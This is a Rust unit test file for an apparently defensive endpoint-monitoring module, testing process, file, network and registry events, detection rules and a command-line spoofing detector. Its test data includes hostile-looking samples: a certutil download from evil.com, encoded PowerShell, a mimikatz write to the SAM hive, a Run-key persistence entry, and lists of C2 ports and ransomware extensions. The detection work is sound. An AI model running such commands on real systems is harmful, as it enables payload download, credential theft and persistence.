//! Comprehensive unit tests for collectors module
//!
//! Tests cover event creation, collector initialization, data processing,
//! serialization, and cross-platform behavior.

#[cfg(test)]
mod process_collector_tests {
    use crate::collectors::{
        Detection, DetectionType, EventPayload, EventType, ProcessEvent, Severity, TelemetryEvent,
    };
    use std::collections::HashMap;

    #[test]
    fn test_process_event_creation() {
        let event = ProcessEvent {
            pid: 1234,
            ppid: 1,
            name: "test.exe".to_string(),
            path: "/usr/bin/test".to_string(),
            cmdline: "test --arg".to_string(),
            user: "root".to_string(),
            sha256: vec![0xab, 0xcd, 0xef],
            entropy: 7.2,
            is_elevated: true,
            parent_name: Some("init".to_string()),
            parent_path: Some("/sbin/init".to_string()),
            is_signed: false,
            signer: None,
            start_time: 1234567890,
            cpu_usage: 10.5,
            memory_bytes: 1024 * 1024 * 50, // 50 MB
            company_name: None,
            file_description: None,
            product_name: None,
            file_version: None,
            environment: None,
        };

        assert_eq!(event.pid, 1234);
        assert_eq!(event.ppid, 1);
        assert!(event.is_elevated);
        assert!(!event.is_signed);
        assert_eq!(event.entropy, 7.2);
    }

    #[test]
    fn test_telemetry_event_creation() {
        let process_event = ProcessEvent {
            pid: 5678,
            ppid: 1000,
            name: "malware.exe".to_string(),
            path: "C:\\Temp\\malware.exe".to_string(),
            cmdline: "malware.exe --stealth".to_string(),
            user: "user".to_string(),
            sha256: vec![0x12, 0x34, 0x56],
            entropy: 8.0,
            is_elevated: false,
            parent_name: Some("explorer.exe".to_string()),
            parent_path: Some("C:\\Windows\\explorer.exe".to_string()),
            is_signed: false,
            signer: None,
            start_time: 1234567890,
            cpu_usage: 50.0,
            memory_bytes: 1024 * 1024 * 100,
            company_name: None,
            file_description: None,
            product_name: None,
            file_version: None,
            environment: None,
        };

        let mut event = TelemetryEvent::new(
            EventType::ProcessCreate,
            Severity::High,
            EventPayload::Process(process_event),
        );

        // Add detection
        event.add_detection(Detection {
            detection_type: DetectionType::Entropy,
            rule_name: "high_entropy_pe".to_string(),
            confidence: 0.95,
            description: "Executable with suspicious entropy".to_string(),
            mitre_tactics: vec!["defense_evasion".to_string()],
            mitre_techniques: vec!["T1027".to_string()],
        });

        assert!(!event.event_id.is_empty());
        assert_eq!(event.event_type, EventType::ProcessCreate);
        assert_eq!(event.severity, Severity::High);
        assert_eq!(event.detections.len(), 1);
        assert!(event.timestamp > 0);
    }

    #[test]
    fn test_process_event_serialization() {
        let event = ProcessEvent {
            pid: 9999,
            ppid: 1,
            name: "serialization_test".to_string(),
            path: "/bin/test".to_string(),
            cmdline: "test".to_string(),
            user: "test_user".to_string(),
            sha256: vec![0xaa, 0xbb, 0xcc, 0xdd],
            entropy: 5.5,
            is_elevated: false,
            parent_name: None,
            parent_path: None,
            is_signed: true,
            signer: Some("Test Signer".to_string()),
            start_time: 0,
            cpu_usage: 0.0,
            memory_bytes: 0,
            company_name: Some("Test Corp".to_string()),
            file_description: Some("Test Application".to_string()),
            product_name: Some("Test Product".to_string()),
            file_version: Some("1.0.0".to_string()),
            environment: Some(HashMap::from([
                ("PATH".to_string(), "/usr/bin".to_string()),
                ("USER".to_string(), "test".to_string()),
            ])),
        };

        // Test JSON serialization
        let json = serde_json::to_string(&event).expect("Failed to serialize");
        let deserialized: ProcessEvent =
            serde_json::from_str(&json).expect("Failed to deserialize");

        assert_eq!(event.pid, deserialized.pid);
        assert_eq!(event.name, deserialized.name);
        assert_eq!(event.is_signed, deserialized.is_signed);
        assert_eq!(event.signer, deserialized.signer);
        assert_eq!(event.company_name, deserialized.company_name);
    }

    #[test]
    fn test_event_severity_ordering() {
        assert!(Severity::Critical > Severity::High);
        assert!(Severity::High > Severity::Medium);
        assert!(Severity::Medium > Severity::Low);
        assert!(Severity::Low > Severity::Info);
    }

    #[test]
    fn test_suspicious_process_patterns() {
        // Simulate suspicious process detection
        let patterns = vec![
            ("powershell.exe -enc SGVsbG8=", true),
            ("notepad.exe", false),
            ("certutil.exe -urlcache -f http://evil.com/mal.exe", true),
            ("cmd.exe /c whoami", false),
            ("rundll32.exe javascript:alert(1)", true),
        ];

        for (cmdline, should_be_suspicious) in patterns {
            let is_suspicious = cmdline.contains("-enc")
                || cmdline.contains("-urlcache")
                || cmdline.contains("javascript:");

            assert_eq!(
                is_suspicious, should_be_suspicious,
                "Pattern '{}' mismatch",
                cmdline
            );
        }
    }
}

#[cfg(test)]
mod file_collector_tests {
    use crate::collectors::FileEvent;
    use std::path::PathBuf;

    #[test]
    fn test_file_event_creation() {
        let event = FileEvent {
            path: "/etc/passwd".to_string(),
            old_path: None,
            operation: "read".to_string(),
            pid: 1234,
            process_name: "cat".to_string(),
            sha256: vec![0x11, 0x22, 0x33],
            size: 2048,
            entropy: 4.5,
            file_type: "text".to_string(),
        };

        assert_eq!(event.path, "/etc/passwd");
        assert_eq!(event.operation, "read");
        assert_eq!(event.pid, 1234);
        assert_eq!(event.size, 2048);
    }

    #[test]
    fn test_file_event_serialization() {
        let event = FileEvent {
            path: "C:\\Windows\\System32\\config\\SAM".to_string(),
            old_path: None,
            operation: "write".to_string(),
            pid: 5678,
            process_name: "mimikatz.exe".to_string(),
            sha256: vec![0xde, 0xad, 0xbe, 0xef],
            size: 1024000,
            entropy: 7.8,
            file_type: "binary".to_string(),
        };

        let json = serde_json::to_string(&event).unwrap();
        let deserialized: FileEvent = serde_json::from_str(&json).unwrap();

        assert_eq!(event.path, deserialized.path);
        assert_eq!(event.operation, deserialized.operation);
        assert_eq!(event.entropy, deserialized.entropy);
    }

    #[test]
    fn test_honeyfile_detection() {
        let honeyfiles = vec![
            PathBuf::from("/home/user/passwords.xlsx"),
            PathBuf::from("/home/user/secrets.docx"),
            PathBuf::from("C:\\Users\\Admin\\credentials.txt"),
        ];

        let test_path = PathBuf::from("/home/user/passwords.xlsx");
        assert!(honeyfiles.contains(&test_path));

        let normal_path = PathBuf::from("/home/user/document.txt");
        assert!(!honeyfiles.contains(&normal_path));
    }

    #[test]
    fn test_ransomware_file_patterns() {
        let ransomware_extensions = vec![".encrypted", ".locked", ".crypto", ".WNCRY"];

        let test_files = vec![
            ("document.pdf.encrypted", true),
            ("important.docx.locked", true),
            ("file.txt", false),
            ("photo.jpg.WNCRY", true),
            ("normal.doc", false),
        ];

        for (filename, should_match) in test_files {
            let matches = ransomware_extensions
                .iter()
                .any(|ext| filename.ends_with(ext));

            assert_eq!(
                matches, should_match,
                "File '{}' pattern mismatch",
                filename
            );
        }
    }

    #[test]
    fn test_high_entropy_detection() {
        let files = vec![
            ("encrypted_file.bin", 7.9, true),
            ("text_document.txt", 4.2, false),
            ("compressed_archive.zip", 7.5, true),
            ("source_code.rs", 5.1, false),
        ];

        let entropy_threshold = 7.0;

        for (filename, entropy, should_be_suspicious) in files {
            let is_suspicious = entropy >= entropy_threshold;
            assert_eq!(
                is_suspicious, should_be_suspicious,
                "Entropy check failed for '{}'",
                filename
            );
        }
    }
}

#[cfg(test)]
mod network_collector_tests {
    use crate::collectors::{DnsEvent, NetworkEvent};

    #[test]
    fn test_network_event_creation() {
        let event = NetworkEvent {
            pid: 1234,
            process_name: "chrome.exe".to_string(),
            local_ip: "192.168.1.100".to_string(),
            local_port: 54321,
            remote_ip: "8.8.8.8".to_string(),
            remote_port: 443,
            protocol: "tcp".to_string(),
            direction: "outbound".to_string(),
            bytes_sent: 1024,
            bytes_received: 2048,
            ..Default::default()
        };

        assert_eq!(event.pid, 1234);
        assert_eq!(event.remote_ip, "8.8.8.8");
        assert_eq!(event.remote_port, 443);
        assert_eq!(event.protocol, "tcp");
    }

    #[test]
    fn test_dns_event_creation() {
        let event = DnsEvent {
            pid: 5678,
            process_name: "firefox.exe".to_string(),
            query: "www.example.com".to_string(),
            query_type: "A".to_string(),
            responses: vec!["93.184.216.34".to_string()],
        };

        assert_eq!(event.query, "www.example.com");
        assert_eq!(event.query_type, "A");
        assert_eq!(event.responses.len(), 1);
    }

    #[test]
    fn test_dga_domain_detection() {
        let domains = vec![
            ("www.google.com", false),
            ("xyzabc123def456ghi.com", true),
            ("mail.example.org", false),
            ("kj3h4k5j3h4k5j3h4.net", true),
            ("legitimate-domain.com", false),
        ];

        for (domain, should_be_dga) in domains {
            // Simple DGA heuristic: >15 chars and a high consonant *ratio*.
            // A raw consonant count flags long but legitimate names (e.g.
            // "legitimate-domain.com"), so compare consonants to total letters.
            let letters = domain.chars().filter(|c| c.is_alphabetic()).count();
            let consonants = domain
                .chars()
                .filter(|c| c.is_alphabetic())
                .filter(|c| !"aeiou".contains(c.to_lowercase().next().unwrap()))
                .count();
            let consonant_ratio = if letters > 0 {
                consonants as f64 / letters as f64
            } else {
                0.0
            };
            let is_suspicious = domain.len() > 15 && consonant_ratio > 0.6;

            assert_eq!(
                is_suspicious, should_be_dga,
                "DGA check failed for '{}'",
                domain
            );
        }
    }

    #[test]
    fn test_c2_detection_patterns() {
        let connections = vec![
            ("192.168.1.100", 443, false),
            ("1.2.3.4", 4444, true), // Common C2 port
            ("8.8.8.8", 53, false),
            ("10.0.0.1", 8080, false),
            ("suspicious-domain.ru", 31337, true),
        ];

        let suspicious_ports = vec![4444, 31337, 6666, 1337];

        for (remote_host, port, should_be_suspicious) in connections {
            let is_suspicious = suspicious_ports.contains(&port);
            assert_eq!(
                is_suspicious, should_be_suspicious,
                "C2 detection failed for {}:{}",
                remote_host, port
            );
        }
    }

    #[test]
    fn test_network_event_serialization() {
        let event = NetworkEvent {
            pid: 9999,
            process_name: "suspicious.exe".to_string(),
            local_ip: "10.0.0.5".to_string(),
            local_port: 49152,
            remote_ip: "1.2.3.4".to_string(),
            remote_port: 4444,
            protocol: "tcp".to_string(),
            direction: "outbound".to_string(),
            bytes_sent: 5000,
            bytes_received: 10000,
            ..Default::default()
        };

        let json = serde_json::to_string(&event).unwrap();
        let deserialized: NetworkEvent = serde_json::from_str(&json).unwrap();

        assert_eq!(event.pid, deserialized.pid);
        assert_eq!(event.remote_ip, deserialized.remote_ip);
        assert_eq!(event.bytes_sent, deserialized.bytes_sent);
    }
}

#[cfg(test)]
mod registry_collector_tests {
    use crate::collectors::RegistryEvent;

    #[test]
    fn test_registry_event_creation() {
        let event = RegistryEvent {
            key_path: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
            value_name: Some("Malware".to_string()),
            value_data: Some("C:\\Temp\\malware.exe".to_string()),
            operation: "set_value".to_string(),
            pid: 1234,
            process_name: "regedit.exe".to_string(),
        };

        assert!(event.key_path.contains("Run"));
        assert_eq!(event.operation, "set_value");
        assert!(event.value_data.unwrap().contains("malware.exe"));
    }

    #[test]
    fn test_persistence_registry_keys() {
        let persistence_keys = vec![
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "HKLM\\System\\CurrentControlSet\\Services",
        ];

        let test_key = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        assert!(persistence_keys.contains(&test_key));

        let normal_key = "HKCU\\Software\\MyApp\\Settings";
        assert!(!persistence_keys.contains(&normal_key));
    }

    #[test]
    fn test_registry_event_serialization() {
        let event = RegistryEvent {
            key_path: "HKCU\\Software\\Test".to_string(),
            value_name: Some("TestValue".to_string()),
            value_data: Some("test_data".to_string()),
            operation: "create".to_string(),
            pid: 5678,
            process_name: "test.exe".to_string(),
        };

        let json = serde_json::to_string(&event).unwrap();
        let deserialized: RegistryEvent = serde_json::from_str(&json).unwrap();

        assert_eq!(event.key_path, deserialized.key_path);
        assert_eq!(event.operation, deserialized.operation);
    }
}

#[cfg(test)]
mod detection_tests {
    use crate::collectors::{Detection, DetectionType};

    #[test]
    fn test_detection_creation() {
        let detection = Detection {
            detection_type: DetectionType::Yara,
            rule_name: "Malware_Generic".to_string(),
            confidence: 0.95,
            description: "Generic malware signature detected".to_string(),
            mitre_tactics: vec!["execution".to_string()],
            mitre_techniques: vec!["T1059".to_string()],
        };

        assert_eq!(detection.detection_type, DetectionType::Yara);
        assert_eq!(detection.confidence, 0.95);
        assert_eq!(detection.mitre_techniques.len(), 1);
    }

    #[test]
    fn test_detection_types() {
        let types = vec![
            DetectionType::Yara,
            DetectionType::Sigma,
            DetectionType::Entropy,
            DetectionType::Behavioral,
            DetectionType::Ml,
            DetectionType::Ransomware,
        ];

        assert_eq!(types.len(), 6);
        assert!(types.contains(&DetectionType::Yara));
        assert!(types.contains(&DetectionType::Ml));
    }

    #[test]
    fn test_mitre_mapping() {
        let tactics = vec![
            ("initial_access", "T1189"),
            ("execution", "T1059"),
            ("persistence", "T1547"),
            ("privilege_escalation", "T1068"),
            ("defense_evasion", "T1027"),
            ("credential_access", "T1003"),
            ("discovery", "T1083"),
            ("lateral_movement", "T1021"),
            ("collection", "T1005"),
            ("exfiltration", "T1041"),
            ("impact", "T1486"),
        ];

        for (tactic, technique) in tactics {
            assert!(!tactic.is_empty());
            assert!(technique.starts_with('T'));
        }
    }
}

#[cfg(test)]
mod event_payload_tests {
    use crate::collectors::{EventPayload, FileEvent, ProcessEvent};

    #[test]
    fn test_event_payload_variants() {
        let process_payload = EventPayload::Process(ProcessEvent {
            pid: 1,
            ppid: 0,
            name: "test".to_string(),
            path: "/bin/test".to_string(),
            cmdline: "test".to_string(),
            user: "root".to_string(),
            sha256: vec![],
            entropy: 5.0,
            is_elevated: false,
            parent_name: None,
            parent_path: None,
            is_signed: false,
            signer: None,
            start_time: 0,
            cpu_usage: 0.0,
            memory_bytes: 0,
            company_name: None,
            file_description: None,
            product_name: None,
            file_version: None,
            environment: None,
        });

        match process_payload {
            EventPayload::Process(_) => assert!(true),
            _ => panic!("Wrong payload variant"),
        }
    }

    #[test]
    fn test_payload_serialization() {
        let payload = EventPayload::File(FileEvent {
            path: "/tmp/test".to_string(),
            old_path: None,
            operation: "create".to_string(),
            pid: 123,
            process_name: "touch".to_string(),
            sha256: vec![0xaa],
            size: 0,
            entropy: 0.0,
            file_type: "regular".to_string(),
        });

        let json = serde_json::to_string(&payload).unwrap();
        assert!(json.contains("test"));
    }
}

#[cfg(test)]
mod cmdline_spoofing_tests {
    use crate::collectors::process::CommandLineSpoofingDetector;
    use std::collections::HashSet;

    #[test]
    fn test_detector_creation() {
        let detector = CommandLineSpoofingDetector::new();
        assert_eq!(detector.tracked_count(), 0);
    }

    #[test]
    fn test_detector_with_capacity() {
        let detector = CommandLineSpoofingDetector::with_capacity(500);
        assert_eq!(detector.tracked_count(), 0);
    }

    #[test]
    fn test_record_and_check_no_spoofing() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Record original command line
        detector.record_creation(1234, "notepad.exe /a test.txt".to_string());
        assert_eq!(detector.tracked_count(), 1);

        // Check with same command line - no spoofing
        let alert = detector.check_for_spoofing(1234, "notepad.exe /a test.txt");
        assert!(alert.is_none());
    }

    #[test]
    fn test_record_and_check_with_spoofing() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Record original benign command line
        detector.record_creation(5678, "notepad.exe".to_string());

        // Check with completely different command line - should detect spoofing
        let alert = detector.check_for_spoofing(5678, "powershell.exe -enc JABjAGwAaQBlAG4AdAA=");
        assert!(alert.is_some());

        let alert = alert.unwrap();
        assert_eq!(alert.pid, 5678);
        assert_eq!(alert.original_cmdline, "notepad.exe");
        assert!(alert.current_cmdline.contains("powershell"));
    }

    #[test]
    fn test_excluded_process() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Java processes are excluded by default
        detector.record_creation_with_name(9999, "java.exe -jar app.jar".to_string(), "java.exe");

        // Java process should not be tracked
        assert_eq!(detector.tracked_count(), 0);
    }

    #[test]
    fn test_normalization_ignores_whitespace() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Record with extra whitespace
        detector.record_creation(1111, "cmd.exe   /c    dir".to_string());

        // Check with normalized whitespace - should NOT be spoofing
        let alert = detector.check_for_spoofing(1111, "cmd.exe /c dir");
        assert!(alert.is_none());
    }

    #[test]
    fn test_normalization_case_insensitive() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Record with uppercase
        detector.record_creation(2222, "CMD.EXE /C DIR".to_string());

        // Check with lowercase - should NOT be spoofing
        let alert = detector.check_for_spoofing(2222, "cmd.exe /c dir");
        assert!(alert.is_none());
    }

    #[test]
    fn test_remove_process() {
        let mut detector = CommandLineSpoofingDetector::new();

        detector.record_creation(3333, "test.exe".to_string());
        assert_eq!(detector.tracked_count(), 1);

        detector.remove_process(3333);
        assert_eq!(detector.tracked_count(), 0);
    }

    #[test]
    fn test_gc_dead_processes() {
        let mut detector = CommandLineSpoofingDetector::new();

        detector.record_creation(1000, "alive.exe".to_string());
        detector.record_creation(2000, "dead.exe".to_string());
        detector.record_creation(3000, "also_dead.exe".to_string());

        let mut live_pids = HashSet::new();
        live_pids.insert(1000);

        detector.gc_dead_processes(&live_pids);

        assert_eq!(detector.tracked_count(), 1);
        // Only PID 1000 should remain
        assert!(detector.check_for_spoofing(1000, "alive.exe").is_none());
        assert!(detector.check_for_spoofing(2000, "dead.exe").is_none()); // Not tracked anymore
    }

    #[test]
    fn test_tracked_pids_iterator() {
        let mut detector = CommandLineSpoofingDetector::new();

        detector.record_creation(100, "a.exe".to_string());
        detector.record_creation(200, "b.exe".to_string());
        detector.record_creation(300, "c.exe".to_string());

        let pids: Vec<u32> = detector.tracked_pids().collect();
        assert_eq!(pids.len(), 3);
        assert!(pids.contains(&100));
        assert!(pids.contains(&200));
        assert!(pids.contains(&300));
    }

    #[test]
    fn test_similarity_threshold() {
        let mut detector = CommandLineSpoofingDetector::new();

        // Record a command line
        detector.record_creation(
            4444,
            "notepad.exe C:\\Users\\test\\document.txt".to_string(),
        );

        // Small change (same program, slightly different path) - should NOT be spoofing
        // because similarity is still > 70%
        let alert = detector.check_for_spoofing(4444, "notepad.exe C:\\Users\\test\\doc.txt");
        assert!(alert.is_none());

        // Completely different command - should BE spoofing
        let mut detector2 = CommandLineSpoofingDetector::new();
        detector2.record_creation(5555, "notepad.exe".to_string());
        let alert2 = detector2.check_for_spoofing(5555, "calc.exe /malicious /payload");
        assert!(alert2.is_some());
    }

    #[test]
    fn test_cache_eviction() {
        // Create detector with very small capacity
        let mut detector = CommandLineSpoofingDetector::with_capacity(10);

        // Add more entries than capacity
        for i in 0..15 {
            detector.record_creation(i, format!("process_{}.exe", i));
        }

        // Should have evicted some entries
        assert!(detector.tracked_count() <= 10);
    }
}
